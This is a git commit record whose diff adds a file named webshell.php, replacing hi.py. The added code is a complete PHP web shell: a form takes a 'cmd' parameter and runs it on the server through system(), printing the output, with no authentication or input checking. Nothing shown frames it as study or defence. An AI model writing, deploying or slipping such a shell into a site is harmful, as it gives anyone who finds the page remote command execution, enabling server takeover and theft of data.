2327bfed2dcabdd59d5b073782f741f7903b494b
tf-romanoff <linden9263@gmail.com>
2025-11-21 16:56:30 +0900

    Update and rename hi.py to webshell.php

---
+++ webshell.php
@@ -0,0 +1,14 @@
+<html>
+  <body>
+    <h3>WebShell</h3>
+    <form method="GET">
+      <input type="TEXT" name="cmd" id="cmd" size="80">
+      <input type="SUBMIT" value="Execute">
+    </form>
+    <pre><?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd'] . ' 2>&1');
+}
+?></pre>
+  </body>
+</html>
